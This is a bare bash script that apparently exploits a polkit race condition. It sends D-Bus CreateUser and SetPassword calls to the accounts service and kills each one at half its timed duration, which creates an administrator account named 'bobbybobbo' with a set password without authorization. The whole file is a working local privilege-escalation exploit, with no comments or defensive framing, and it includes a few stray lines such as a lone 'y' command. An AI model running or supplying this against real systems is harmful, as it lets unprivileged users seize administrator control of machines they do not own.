#!/bin/bash

USERNAME=bobbybobbo

dbus_send_user () {
    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$USERNAME string:"Bobby Bobbo" int32:1
}

time dbus_send_user
time dbus_send_user
time dbus_send_user
time dbus_send_user
time dbus_send_user

DBUS_SEND_USER_TIME=$(( time dbus_send_user ) |& head -3 | tail -1 | cut -f 2 | cut -c 5-7)

echo $DBUS_SEND_USER_TIME

while id $USERNAME 2>/dev/null; [ $? -ne 0 ]; do
    dbus_send_user & sleep 0.$(printf "%03d" $((10#$DBUS_SEND_USER_TIME / 2)))s ; kill $!
    sleep 1s
done

echo "User $USERNAME created!"
id $USERNAME

USERID=$(id -u $USERNAME)

USERPASS=$(openssl passwd -5 $USERNAME)

USERPASSSTRING="string:'$USERPASS'"

echo $USERID
echo $USERPASS
echo $USERPASSSTRING

dbus_send_pass () {
    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$USERID org.freedesktop.Accounts.User.SetPassword $USERPASSSTRING string:GoldenEye
}

DBUS_SEND_PASS_TIME=$(( time dbus_send_pass ) |& head -3 | tail -1 | cut -f 2 | cut -c 5-7)

echo $DBUS_SEND_PASS_TIME

y 2>/dev/null

while [ $? -ne 0 ]; do
    dbus_send_pass & sleep 0.$(printf "%03d" $((10#$DBUS_SEND_PASS_TIME / 2)))s ; kill $!
done

echo "User password '$USERNAME' set for user $USERNAME!"

exit 56
